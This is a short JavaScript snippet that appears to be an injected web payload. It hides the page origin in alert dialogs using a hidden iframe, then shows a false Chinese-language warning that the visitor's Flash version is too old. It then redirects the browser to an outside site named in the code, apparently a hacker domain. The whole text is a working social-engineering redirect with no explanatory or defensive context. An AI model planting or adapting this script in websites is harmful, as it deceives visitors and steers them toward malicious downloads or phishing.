window.alert = function(name){
var iframe = document. createElement("IFRAME");
iframe.style.display="none";
iframe.setAttribute("src",'data:text/plain,');
document. documentElement.appendChild(iframe);
window.frames [0].window.alert(name);
iframe.parentNode.removeChild(iframe);
}
alert( "您的FLASH版本过低，尝试升级后访问该页面! ");
window. location.href="http://www.hackxc.cc";
